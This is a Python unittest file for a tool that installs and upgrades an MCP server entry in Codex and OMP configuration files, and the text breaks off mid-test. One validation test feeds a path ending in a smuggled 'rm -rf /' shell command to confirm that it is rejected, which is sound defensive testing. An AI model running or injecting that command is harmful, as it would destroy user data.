from __future__ import annotations

import contextlib
import hashlib
import json
import os
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path
from unittest import mock

SCRIPTS = Path(__file__).resolve().parents[1] / "sbtd-workflow-onboard" / "scripts"
sys.path.insert(0, str(SCRIPTS))

import sbtd_upgrade_hosts as hosts
from onboard_contracts import ContractError
from sbtd_migration_files import require_private_directory

# Fixed protocol fixture, deliberately independent of implementation constants.
PINNED_TOOLS = [
    "graft_check_freshness", "graft_file_api", "graft_find_all",
    "graft_find_code", "graft_repo_map", "graft_trace_calls",
]
GRAFT_VERSION = "0.22.0"
SECRET = "sk-live-secret-9f8e7d6c5b4a"


# ---------------------------------------------------------------------------
# Fixture builders
# ---------------------------------------------------------------------------


def _posix_path_export(path: Path) -> bytes:
    value = path.as_posix()
    if os.name == "nt" and path.drive:
        value = "/" + path.drive[0].lower() + value[2:]
    quoted = value.replace("'", "'\\''")
    return f"export PATH='{quoted}':$PATH\n".encode()


def _write_graft(bin_dir: Path) -> Path:
    target = bin_dir / ("graft.exe" if os.name == "nt" else "graft")
    if os.name == "nt":
        shutil.copyfile(sys.executable, target)
    else:
        target.write_bytes(b"#!/bin/sh\nexit 0\n")
        target.chmod(0o755)
    return target


def _package(base: Path) -> Path:
    root = base / "package"
    (root / "scripts").mkdir(parents=True, exist_ok=True)
    (root / "scripts" / "sbtd_graft_entry.py").write_bytes(b"# managed launcher\n")
    return root


def _runtime(base: Path, name: str = "runtime") -> dict[str, str]:
    directory = base / name
    directory.mkdir(exist_ok=True)
    paths: dict[str, str] = {}
    # The managed CLI is always the pinned cli.js; the owned-shape ownership
    # gates refuse any other entry filename.
    for key, filename in (("python", "python"), ("node", "node"), ("cli", "cli.js")):
        target = directory / filename
        target.write_bytes(b"")
        paths[key] = str(target)
    return paths


def _managed_args(package: Path, runtime: dict[str, str]) -> list[str]:
    launcher = str(package / "scripts" / "sbtd_graft_entry.py")
    return [
        "-E",
        "-s",
        launcher,
        "mcp",
        "--node",
        runtime["node"],
        "--entry",
        runtime["cli"],
    ]


def _codex_toml(command: str, args: list[str]) -> bytes:
    env = 'DO_NOT_TRACK = "1"\nDNT = "1"\n'
    return (
        "[mcp_servers.sbtd-graft]\n"
        f"command = {json.dumps(command)}\n"
        f"args = {json.dumps(args)}\n"
        "[mcp_servers.sbtd-graft.env]\n"
        f"{env}"
    ).encode()


def _rendered_record(rendered: bytes) -> tuple[str, list[str]]:
    """Parsed managed record: exact binding values, never raw TOML bytes.

    TOML string escaping (backslashes on Windows) makes byte-substring checks
    platform-naive; parsing proves the actual bound argv on every platform.
    """
    import tomlkit

    parsed = tomlkit.parse(rendered.decode("utf-8"))
    record = parsed["mcp_servers"]["sbtd-graft"]
    return str(record["command"]), [str(item) for item in record["args"]]


def _codex_host(
    base: Path,
    runtime: dict[str, str],
    *,
    host_id: str = "codex-account",
    skills_roots: list[Path] | None = None,
    project_roots: list[Path] | None = None,
    executable: Path | None = None,
) -> dict:
    account = base / "account"
    entry = {
        "id": host_id,
        "platform": "codex",
        "config_home": str(account / ".codex"),
        "config": str(account / ".codex" / "config.toml"),
        "runtime": dict(runtime),
        "skills_roots": [str(root) for root in skills_roots or []],
        "project_roots": [str(root) for root in project_roots or []],
    }
    if not skills_roots:
        entry["onboard_root"] = str(base / "package")
    if executable is not None:
        entry["executable"] = str(executable)
    return entry


def _omp_host(
    base: Path,
    runtime: dict[str, str],
    *,
    host_id: str = "omp-account",
    skills_roots: list[Path] | None = None,
    project_roots: list[Path] | None = None,
    profile: str | None = None,
    executable: Path | None = None,
) -> dict:
    account = base / "account"
    config_home = account / ".omp"
    if profile is None:
        config = config_home / "agent" / "mcp.json"
    else:
        config = config_home / "profiles" / profile / "agent" / "mcp.json"
    entry = {
        "id": host_id,
        "platform": "omp",
        "config_home": str(config_home),
        "config": str(config),
        "runtime": dict(runtime),
        "skills_roots": [str(root) for root in skills_roots or []],
        "project_roots": [str(root) for root in project_roots or []],
    }
    if not skills_roots:
        entry["onboard_root"] = str(base / "package")
    if executable is not None:
        entry["executable"] = str(executable)
    return entry


def _skills_root(base: Path, names: list[str], dirname: str = "skills") -> Path:
    root = base / dirname
    for name in names:
        skill = root / name
        skill.mkdir(parents=True, exist_ok=True)
        (skill / "SKILL.md").write_text(
            f"---\nname: {name}\ndescription: test skill\n---\n",
            encoding="utf-8",
        )
    # A selected host uses this installed copy, never the source package.
    installed = root / "sbtd-workflow-onboard" / "scripts"
    installed.mkdir(parents=True, exist_ok=True)
    (installed / "sbtd_graft_entry.py").write_bytes(b"# managed launcher\n")
    return root


def _write(path: Path, content: bytes) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(content)


def _tree_bytes(root: Path) -> dict[str, bytes]:
    return {
        path.relative_to(root).as_posix(): path.read_bytes()
        for path in sorted(root.rglob("*"))
        if path.is_file()
    }


def _resource_json(resources) -> str:
    return json.dumps(resources, ensure_ascii=False, sort_keys=True)


# ---------------------------------------------------------------------------
# Scripted probe doubles (never a real spawn; evidence stays observable)
# ---------------------------------------------------------------------------


class _Stdin:
    def __init__(self, proc: _ScriptedProc) -> None:
        self._proc = proc

    def write(self, data: bytes) -> int:
        line = data.decode("utf-8").strip()
        if line:
            self._proc._feed(json.loads(line))
        return len(data)

    def flush(self) -> None:
        return None

    def close(self) -> None:
        self._proc._close()


class _Stdout:
    def __init__(self, proc: _ScriptedProc) -> None:
        self._proc = proc

    def readline(self) -> bytes:
        return self._proc._next_line()

    def close(self) -> None:
        # Closing the owned stdout wakes a pump blocked in readline, exactly
        # like EOF from the real child's pipe.
        self._proc._close()


class _ScriptedProc:
    """In-memory Popen double: one scripted JSON response per request."""

    def __init__(self, handler, exit_code: int = 0) -> None:
        self._handler = handler
        self._exit_code = exit_code
        self._condition = threading.Condition()
        self._pending: list[bytes] = []
        self._closed = False
        self.returncode: int | None = None
        self.stdin = _Stdin(self)
        self.stdout = _Stdout(self)
        self.requests: list[dict] = []

    def _feed(self, request: dict) -> None:
        self.requests.append(request)
        response = self._handler(request)
        if response is None:
            return
        with self._condition:
            self._pending.append((json.dumps(response) + "\n").encode("utf-8"))
            self._condition.notify_all()

    def _close(self) -> None:
        with self._condition:
            self._closed = True
            self._condition.notify_all()

    def _next_line(self) -> bytes:
        with self._condition:
            while not self._pending:
                if self._closed or self.returncode is not None:
                    return b""
                self._condition.wait(timeout=5.0)
                if not self._pending and (self._closed or self.returncode is not None):
                    return b""
            return self._pending.pop(0)

    def wait(self, timeout: float | None = None) -> int:
        with self._condition:
            if self.returncode is None:
                self.returncode = self._exit_code
                self._condition.notify_all()
            return self.returncode

    def terminate(self) -> None:
        self.wait()

    def kill(self) -> None:
        self.wait()


class _ProbeRig:
    """Monkeypatches the module probe seams with scripted doubles."""

    def __init__(self, testcase: unittest.TestCase, expected_skills: list[str]) -> None:
        self.testcase = testcase
        self.expected_skills = list(expected_skills)
        self.extra_roots: list[str] = []
        self.spawns: list[tuple[list[str], dict[str, str], str]] = []
        self.fixture_configs: list[bytes] = []
        self.procs: list[_ScriptedProc] = []
        self.codex_available = True
        self.omp_available = True
        self.tools = PINNED_TOOLS
        self.server_version = GRAFT_VERSION
        self.runtime_status = "connected"
        self.codex_skills_enabled = True
        self.omp_commands = None
        self.omp_fixture_files: dict[str, bytes] = {}
        # R13: structured get_state dumpTools evidence (authoritative registry),
        # deliberately independent of any prompt text. None builds the default
        # six pinned mcp__sbtd_graft_* tool definitions with schemas.
        self.omp_dump_tools = None
        # Optional transform applied to the get_state response envelope, for
        # strict-envelope negative evidence (event type, missing success...).
        self.omp_envelope_transform = None
        self.omp_system_prompt = "sbtd upgrade probe fixture prompt"

    def _mcp_handler(self, request: dict):
        method = request.get("method")
        request_id = request.get("id")
        if request_id is None:
            return None
        if method == "initialize":
            return {
                "jsonrpc": "2.0",
                "id": request_id,
                "result": {
                    "protocolVersion": "2024-11-05",
                    "capabilities": {},
                    "serverInfo": {"name": "graft", "version": self.server_version},
                },
            }
        if method == "tools/list":
            return {
                "jsonrpc": "2.0",
                "id": request_id,
                "result": {"tools": [{"name": name} for name in self.tools]},
            }
        return None

    def _codex_handler(self, request: dict):
        method = request.get("method")
        request_id = request.get("id")
        if request_id is None:
            return None
        if method == "initialize":
            return {"jsonrpc": "2.0", "id": request_id, "result": {"codexHome": "/fixture"}}
        if method == "thread/start":
            return {
                "jsonrpc": "2.0",
                "id": request_id,
                "result": {"thread": {"id": "thread-1"}},
            }
        if method == "config/mcpServer/reload":
            return {"jsonrpc": "2.0", "id": request_id, "result": {}}
        if method == "mcpServerStatus/list":
            tools = {name: {} for name in self.tools}
            return {
                "jsonrpc": "2.0",
                "id": request_id,
                "result": {
                    "data": [
                        {
                            "name": "sbtd-graft",
                            "runtimeStatus": self.runtime_status,
                            "tools": tools,
                            "serverInfo": {"name": "graft", "version": self.server_version},
                        }
                    ]
                },
            }
        if method == "skills/extraRoots/set":
            self.extra_roots = list(request["params"]["extraRoots"])
            return {"jsonrpc": "2.0", "id": request_id, "result": {}}
        if method == "skills/list":
            prefix = self.extra_roots[0] if self.extra_roots else "/nowhere"
            skills = [
                {
                    "name": name,
                    "path": os.path.join(prefix, name, "SKILL.md"),
                    "enabled": self.codex_skills_enabled,
                }
                for name in self.expected_skills
            ]
            entry = {
                "cwd": request["params"]["cwds"][0],
                "skills": skills,
                "errors": [],
            }
            return {"jsonrpc": "2.0", "id": request_id, "result": {"data": [entry]}}
        return None

    def _omp_handler(self, request: dict):
        rtype = request.get("type")
        request_id = request.get("id")
        if request_id is None:
            return None
        if rtype == "negotiate_protocol":
            return {
                "id": request_id,
                "type": "response",
                "command": rtype,
                "success": True,
                "data": {},
            }
        if rtype == "get_state":
            tools = self.omp_dump_tools
            if tools is None:
                tools = [
                    {
                        "name": f"mcp__sbtd_graft_{name}",
                        "description": f"pinned graft tool {name}",
                        "parameters": {"type": "object", "properties": {}},
                    }
                    for name in self.tools
                ]
            envelope = {
                "id": request_id,
                "type": "response",
                "command": rtype,
                "success": True,
                "data": {
                    "systemPrompt": [self.omp_system_prompt],
                    "dumpTools": tools,
                },
            }
            if self.omp_envelope_transform is not None:
                envelope = self.omp_envelope_transform(envelope)
            return envelope
        if rtype == "get_available_commands":
            return {
                "id": request_id,
                "type": "response",
                "command": rtype,
                "success": True,
                "data": self.omp_commands if self.omp_commands is not None else [
                    {"name": f"skill:{name}"} for name in self.expected_skills
                ],
            }
        return None

    def _spawn(self, argv, *, env, cwd):
        self.spawns.append((list(argv), dict(env), str(cwd)))
        if "app-server" in argv:
            codex_home = env.get("CODEX_HOME")
            if codex_home:
                config = Path(codex_home) / "config.toml"
                if config.is_file():
                    self.fixture_configs.append(config.read_bytes())
            proc = _ScriptedProc(self._codex_handler)
        elif "--mode" in argv:
            fixture = Path(env["TMPDIR"])
            self.omp_fixture_files = _tree_bytes(fixture)
            proc = _ScriptedProc(self._omp_handler)
        else:
            proc = _ScriptedProc(self._mcp_handler)
        self.procs.append(proc)
        return proc

    def _which(self, name: str):
        if name == "codex" and self.codex_available:
            return "/fake/bin/codex"
        if name == "omp" and self.omp_available:
            return "/fake/bin/omp"
        return None


    def install(self) -> _ProbeRig:
        testcase = self.testcase
        testcase.addCleanup(self._restore)
        self._saved = (
            hosts._spawn,
            hosts._which,
            hosts.validate_project,
            hosts.validate_runtime,
            hosts._HOST_TIMEOUT,
        )
        hosts._spawn = self._spawn
        hosts._which = self._which
        hosts.validate_project = lambda root: {"root": str(root)}
        hosts.validate_runtime = lambda node, cli: {"node": str(node), "cli": str(cli)}
        # Bounded polling budget for scripted doubles; production value unchanged.
        hosts._HOST_TIMEOUT = 3.0
        return self

    def _restore(self) -> None:
        hosts._spawn, hosts._which, hosts.validate_project, hosts.validate_runtime, hosts._HOST_TIMEOUT = self._saved


# ---------------------------------------------------------------------------
# Scope validation
# ---------------------------------------------------------------------------


class NativeCodexIsolationTests(unittest.TestCase):
    @unittest.skipUnless(
        os.environ.get("SBTD_NATIVE_CODEX") == "1" and shutil.which("codex"),
        "opt-in native Codex required",
    )
    def test_probe_does_not_start_project_local_mcp(self):
        """U26: native Codex loads the selected server, not project-local peers."""
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            package = _package(base)
            project = base / "project"
            project.mkdir()
            environment = hosts._probe_env(base, {})
            (base / "home").mkdir()
            subprocess.run(
                ["git", "init", "-q", str(project)], env=environment,
                capture_output=True, check=True,
            )
            marker = base / "unselected-started"
            peer = (
                "import json,sys\nfrom pathlib import Path\n"
                "if sys.argv[-1] == 'unselected': Path(sys.argv[-2]).write_text('started')\n"
                "for line in sys.stdin:\n"
                " r=json.loads(line)\n"
                " if 'id' not in r: continue\n"
                " result=({'protocolVersion':'2024-11-05','capabilities':{'tools':{}},"
                "'serverInfo':{'name':'fixture','version':'0.22.0'}}"
                " if r['method']=='initialize' else {'tools':[]})\n"
                " print(json.dumps({'jsonrpc':'2.0','id':r['id'],'result':result}),flush=True)\n"
            )
            launcher = package / "scripts/sbtd_graft_entry.py"
            launcher.write_text(peer, encoding="utf-8")
            local = project / ".codex/config.toml"
            _write(local, (
                "[mcp_servers.unselected]\n"
                f"command = {json.dumps(sys.executable)}\n"
                f"args = {json.dumps(['-I', str(launcher), str(marker), 'unselected'])}\n"
            ).encode())
            original = local.read_bytes()
            runtime = _runtime(base)
            runtime["python"] = sys.executable
            bindings = hosts.launch_bindings([], runtime, package_root=package)
            evidence = hosts._probe_codex(
                shutil.which("codex"), {"skills_roots": []}, bindings, project,
            )
            self.assertFalse(marker.exists(), "unselected project MCP was started")
            self.assertEqual(evidence["server"]["status"], "connected")
            self.assertEqual(local.read_bytes(), original)


class ScopeValidationTests(unittest.TestCase):
    def test_scope_must_be_a_mapping(self) -> None:
        with tempfile.TemporaryDirectory() as directory, self.assertRaises(ContractError) as caught:
            hosts.build_host_resources([], package_root=Path(directory))
        self.assertEqual(caught.exception.code, "scope-conflict")

    def test_config_must_live_inside_config_home(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            host = _codex_host(base, runtime)
            host["config"] = str(base / "elsewhere" / "config.toml")
            with self.assertRaises(ContractError) as caught:
                hosts.build_host_resources(
                    {"hosts": [host]}, package_root=_package(base)
                )
        self.assertEqual(caught.exception.code, "scope-conflict")

    def test_host_skills_root_must_be_selected_top_level(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            stray = _skills_root(base, ["alpha"], dirname="stray")
            host = _codex_host(base, runtime, skills_roots=[stray])
            with self.assertRaises(ContractError) as caught:
                hosts.build_host_resources(
                    {"hosts": [host], "skills_roots": []}, package_root=_package(base)
                )
        self.assertEqual(caught.exception.code, "scope-conflict")

    def test_host_runtime_must_name_exactly_python_node_cli(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            host = _codex_host(base, runtime)
            host["runtime"] = {"python": runtime["python"], "node": runtime["node"]}
            with self.assertRaises(ContractError) as caught:
                hosts.build_host_resources(
                    {"hosts": [host]}, package_root=_package(base)
                )
        self.assertEqual(caught.exception.code, "scope-conflict")

    def test_duplicate_host_ids_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            host = _codex_host(base, runtime)
            with self.assertRaises(ContractError) as caught:
                hosts.build_host_resources(
                    {"hosts": [host, dict(host)]}, package_root=_package(base)
                )
        self.assertEqual(caught.exception.code, "scope-conflict")

    def test_unsupported_shell_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            with self.assertRaises(ContractError) as caught:
                hosts.build_host_resources(
                    {
                        "shell_profiles": [
                            {
                                "path": str(base / ".config/fish/config.fish"),
                                "shell": "fish",
                                "bin": str(base / "bin"),
                            }
                        ]
                    },
                    package_root=_package(base),
                )
        self.assertEqual(caught.exception.code, "scope-conflict")

    def test_bin_with_newline_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            with self.assertRaises(ContractError) as caught:
                hosts.build_host_resources(
                    {
                        "shell_profiles": [
                            {
                                "path": str(base / ".bashrc"),
                                "shell": "bash",
                                "bin": str(base / "bin") + "\nrm -rf /",
                            }
                        ]
                    },
                    package_root=_package(base),
                )
        self.assertEqual(caught.exception.code, "invalid-argument")

    def test_malformed_decision_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            with self.assertRaises(ContractError) as caught:
                hosts.build_host_resources(
                    {"decisions": {"relative/path": "replace"}},
                    package_root=_package(base),
                )
        self.assertEqual(caught.exception.code, "scope-conflict")


# ---------------------------------------------------------------------------
# Codex MCP resources
# ---------------------------------------------------------------------------


class CodexResourceTests(unittest.TestCase):
    def _build(self, base: Path, scope: dict):
        return hosts.build_host_resources(scope, package_root=_package(base))

    def test_missing_config_installs_and_converges(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            host = _codex_host(base, runtime)
            scope = {"hosts": [host]}
            resources = hosts.build_host_resources(scope, package_root=package)
            self.assertEqual(len(resources), 1)
            resource = resources[0]
            self.assertEqual(resource["kind"], "mcp")
            self.assertEqual(resource["classification"], "missing")
            self.assertEqual(resource["decision"], "install")
            self.assertEqual(resource["before"]["type"], "absent")
            rendered = hosts.render_resource(resource)
            self.assertEqual(
                hashlib.sha256(rendered).hexdigest(), resource["desired"]["checksum"]
            )
            config = Path(host["config"])
            _write(config, rendered)
            converged = hosts.build_host_resources(scope, package_root=package)
            self.assertEqual(converged[0]["classification"], "current")
            self.assertEqual(converged[0]["decision"], "keep")
            self.assertEqual(hosts.render_resource(converged[0]), rendered)
            text = rendered.decode("utf-8")
            self.assertIn("[mcp_servers.sbtd-graft]", text)
            self.assertIn(f"command = {json.dumps(runtime['python'])}", text)
            for token in _managed_args(package, runtime):
                self.assertIn(json.dumps(token), text)
            self.assertIn('DO_NOT_TRACK = "1"', text)

    def test_unrelated_config_is_blocked_without_decision(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            host = _codex_host(base, runtime)
            before = (
                b"# user comment stays\n"
                b"[mcp_servers.other]\n"
                b'command = "/usr/bin/other"\n'
                b"[mcp_servers.other.env]\n"
                + f'API_KEY = "{SECRET}"\n'.encode()
            )
            _write(Path(host["config"]), before)
            resources = self._build(base, {"hosts": [host]})
            resource = resources[0]
            self.assertEqual(resource["classification"], "unknown-drift")
            self.assertEqual(resource["decision"], "blocked")
            self.assertIsNone(resource["desired"])
            self.assertNotIn(SECRET, _resource_json(resources))

    def test_replace_decision_preserves_unrelated_bytes_and_secrets(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            host = _codex_host(base, runtime)
            before = (
                b"# user comment stays\n"
                b"[mcp_servers.other]\n"
                b'command = "/usr/bin/other"\n'
                b"[mcp_servers.other.env]\n"
                + f'API_KEY = "{SECRET}"\n'.encode()
            )
            _write(Path(host["config"]), before)
            scope = {"hosts": [host], "decisions": {host["config"]: "replace"}}
            resources = hosts.build_host_resources(scope, package_root=package)
            resource = resources[0]
            self.assertEqual(resource["decision"], "replace")
            rendered = hosts.render_resource(resource)
            self.assertTrue(rendered.startswith(b"# user comment stays\n"))
            self.assertIn(SECRET.encode("utf-8"), rendered)
            self.assertIn(b'command = "/usr/bin/other"', rendered)
            self.assertIn(b"[mcp_servers.sbtd-graft]", rendered)
            self.assertNotIn(SECRET, _resource_json(resources))

    def test_owned_legacy_runtime_entry_is_claimed(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            old = _runtime(base, "old-runtime")
            package = _package(base)
            host = _codex_host(base, runtime)
            old_args = _managed_args(package, old)
            _write(Path(host["config"]), _codex_toml(old["python"], old_args))
            scope = {"hosts": [host], "decisions": {host["config"]: "replace"}}
            resources = hosts.build_host_resources(scope, package_root=package)
            resource = resources[0]
            self.assertEqual(resource["classification"], "unknown-drift")
            self.assertEqual(resource["decision"], "replace")
            rendered = hosts.render_resource(resource)
            text = rendered.decode("utf-8")
            self.assertIn(f"command = {json.dumps(runtime['python'])}", text)
            self.assertNotIn(old["node"], text)
            self.assertNotIn(old["cli"], text)

    def test_owned_shape_with_launcher_outside_package_is_refused(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            old = _runtime(base, "old-runtime")
            package = _package(base)
            host = _codex_host(base, runtime)
            foreign_args = [
                "-E",
                "-s",
                str(base / "other-package" / "scripts" / "sbtd_graft_entry.py"),
                "mcp",
                "--node",
                old["node"],
                "--entry",
                old["cli"],
            ]
            _write(Path(host["config"]), _codex_toml(old["python"], foreign_args))
            scope = {"hosts": [host], "decisions": {host["config"]: "replace"}}
            resources = hosts.build_host_resources(scope, package_root=package)
            resource = resources[0]
            self.assertEqual(resource["classification"], "identity-conflict")
            self.assertEqual(resource["decision"], "blocked")
            self.assertEqual(resource["details"]["error_code"], "ownership-conflict")

    def test_foreign_entry_shape_is_refused(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            host = _codex_host(base, runtime)
            args = _managed_args(package, runtime) + ["--rogue"]
            _write(Path(host["config"]), _codex_toml(runtime["python"], args))
            scope = {"hosts": [host], "decisions": {host["config"]: "replace"}}
            resources = hosts.build_host_resources(scope, package_root=package)
            self.assertEqual(resources[0]["decision"], "blocked")
            self.assertEqual(resources[0]["details"]["error_code"], "ownership-conflict")

    def test_retired_legacy_key_is_blocked_and_listed(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            host = _codex_host(base, runtime)
            legacy_key = "sbtd-graft-a1b2c3d4e5f60718"
            before = (
                f"[mcp_servers.{json.dumps(legacy_key)}]\n"
                f"command = {json.dumps(runtime['python'])}\n"
                f"args = {json.dumps(_managed_args(package, runtime))}\n"
            ).encode()
            _write(Path(host["config"]), before)
            scope = {"hosts": [host], "decisions": {host["config"]: "replace"}}
            resources = hosts.build_host_resources(scope, package_root=package)
            resource = resources[0]
            self.assertEqual(resource["decision"], "blocked")
            self.assertEqual(resource["details"]["legacy"], [legacy_key])
            self.assertNotIn(legacy_key, _resource_json([resource["desired"]]))

    def test_build_is_deterministic(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            scope = {"hosts": [_codex_host(base, runtime)]}
            first = hosts.build_host_resources(scope, package_root=package)
            second = hosts.build_host_resources(scope, package_root=package)
            self.assertEqual(first, second)


# ---------------------------------------------------------------------------
# OMP MCP resources
# ---------------------------------------------------------------------------


class OmpResourceTests(unittest.TestCase):
    def test_missing_config_installs_and_converges(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            host = _omp_host(base, runtime)
            scope = {"hosts": [host]}
            resources = hosts.build_host_resources(scope, package_root=package)
            resource = resources[0]
            self.assertEqual(resource["classification"], "missing")
            self.assertEqual(resource["decision"], "install")
            rendered = hosts.render_resource(resource)
            document = json.loads(rendered.decode("utf-8"))
            server = document["mcpServers"]["sbtd-graft"]
            self.assertEqual(server["type"], "stdio")
            self.assertEqual(server["command"], runtime["python"])
            self.assertEqual(server["args"], _managed_args(package, runtime))
            self.assertEqual(server["env"], {"DO_NOT_TRACK": "1", "DNT": "1"})
            _write(Path(host["config"]), rendered)
            converged = hosts.build_host_resources(scope, package_root=package)
            self.assertEqual(converged[0]["classification"], "current")
            self.assertEqual(converged[0]["decision"], "keep")

    def test_other_server_secret_never_enters_resource_json(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            host = _omp_host(base, runtime)
            before = json.dumps(
                {
                    "mcpServers": {
                        "other": {
                            "type": "stdio",
                            "command": "/usr/bin/other",
                            "env": {"API_KEY": SECRET},
                        }
                    }
                }
            ).encode("utf-8")
            _write(Path(host["config"]), before)
            scope = {"hosts": [host], "decisions": {host["config"]: "replace"}}
            resources = hosts.build_host_resources(scope, package_root=package)
            resource = resources[0]
            self.assertEqual(resource["decision"], "replace")
            rendered = hosts.render_resource(resource)
            document = json.loads(rendered.decode("utf-8"))
            self.assertEqual(document["mcpServers"]["other"]["env"]["API_KEY"], SECRET)
            self.assertIn("sbtd-graft", document["mcpServers"])
            self.assertNotIn(SECRET, _resource_json(resources))

    def test_owned_legacy_runtime_entry_is_claimed(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            old = _runtime(base, "old-runtime")
            package = _package(base)
            host = _omp_host(base, runtime)
            before = json.dumps(
                {
                    "mcpServers": {
                        "sbtd-graft": {
                            "type": "stdio",
                            "command": old["python"],
                            "args": _managed_args(package, old),
                            "env": {"DO_NOT_TRACK": "1", "DNT": "1"},
                        }
                    }
                }
            ).encode("utf-8")
            _write(Path(host["config"]), before)
            scope = {"hosts": [host], "decisions": {host["config"]: "replace"}}
            resources = hosts.build_host_resources(scope, package_root=package)
            resource = resources[0]
            self.assertEqual(resource["classification"], "unknown-drift")
            self.assertEqual(resource["decision"], "replace")
            rendered = json.loads(hosts.render_resource(resource).decode("utf-8"))
            server = rendered["mcpServers"]["sbtd-graft"]
            self.assertEqual(server["command"], runtime["python"])
            self.assertEqual(server["args"], _managed_args(package, runtime))

    def test_foreign_entry_is_refused(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            host = _omp_host(base, runtime)
            before = json.dumps(
                {
                    "mcpServers": {
                        "sbtd-graft": {
                            "type": "stdio",
                            "command": runtime["python"],
                            "args": _managed_args(package, runtime) + ["--rogue"],
                            "env": {"DO_NOT_TRACK": "1", "DNT": "1"},
                        }
                    }
                }
            ).encode("utf-8")
            _write(Path(host["config"]), before)
            scope = {"hosts": [host], "decisions": {host["config"]: "replace"}}
            resources = hosts.build_host_resources(scope, package_root=package)
            self.assertEqual(resources[0]["decision"], "blocked")
            self.assertEqual(
                resources[0]["details"]["error_code"], "ownership-conflict"
            )

    def test_retired_legacy_key_is_blocked_and_listed(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            host = _omp_host(base, runtime)
            legacy_key = "sbtd-graft-a1b2c3d4e5f60718"
            before = json.dumps(
                {
                    "mcpServers": {
                        legacy_key: {
                            "type": "stdio",
                            "command": runtime["python"],
                            "args": _managed_args(package, runtime),
                            "env": {"DO_NOT_TRACK": "1", "DNT": "1"},
                        }
                    }
                }
            ).encode("utf-8")
            _write(Path(host["config"]), before)
            scope = {"hosts": [host], "decisions": {host["config"]: "replace"}}
            resources = hosts.build_host_resources(scope, package_root=package)
            resource = resources[0]
            self.assertEqual(resource["decision"], "blocked")
            self.assertEqual(resource["details"]["legacy"], [legacy_key])

    def test_inherited_equivalent_entry_is_current_without_write(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            host = _omp_host(base, runtime)
            account = base / "account"
            args = _managed_args(package, runtime)
            inherited = (
                "[mcp_servers.sbtd-graft]\n"
                f"command = {json.dumps(runtime['python'])}\n"
                f"args = {json.dumps(args)}\n"
                "[mcp_servers.sbtd-graft.env]\n"
                'DO_NOT_TRACK = "1"\nDNT = "1"\n'
            ).encode()
            _write(account / ".codex" / "config.toml", inherited)
            _write(
                account / ".omp" / "agent" / "config.yml",
                b'enabledProviders: ["codex"]\n',
            )
            resources = hosts.build_host_resources(
                {"hosts": [host]}, package_root=package
            )
            resource = resources[0]
            self.assertEqual(resource["classification"], "current")
            self.assertEqual(resource["decision"], "keep")
            self.assertEqual(resource["before"]["type"], "absent")
            self.assertEqual(hosts.render_resource(resource), b"")

    def test_disabled_inherited_managed_entry_is_refused(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            host = _omp_host(base, runtime)
            account = base / "account"
            args = _managed_args(package, runtime)
            inherited = (
                "[mcp_servers.sbtd-graft]\n"
                f"command = {json.dumps(runtime['python'])}\n"
                f"args = {json.dumps(args)}\n"
                "enabled = false\n"
                "[mcp_servers.sbtd-graft.env]\n"
                'DO_NOT_TRACK = "1"\nDNT = "1"\n'
            ).encode()
            _write(account / ".codex" / "config.toml", inherited)
            # The provider IS opted in, so the inherited source is analyzed;
            # a server-level disabled managed connection there must refuse.
            _write(
                account / ".omp" / "agent" / "config.yml",
                b'enabledProviders: ["codex"]\n',
            )
            resources = hosts.build_host_resources(
                {"hosts": [host]}, package_root=package
            )
            self.assertEqual(resources[0]["decision"], "blocked")
            self.assertEqual(
                resources[0]["details"]["error_code"], "ownership-conflict"
            )

    def test_unselected_inherited_provider_is_invisible(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            base = Path(directory).resolve()
            runtime = _runtime(base)
            package = _package(base)
            host = _omp_host(base, runtime)
            account = base / "account"
            args = _managed_args(package, runtime)
            inherited = (
                "[mcp_servers.sbtd-graft]\n"
                f"command = {json.dumps(runtime['python'])}\n"
                f"args = {json.dumps(args)}\n"
                "[mcp_servers.sbtd-graft.env]\n"
                'DO_NOT_TRACK = "1"\nDNT = "1"\n'
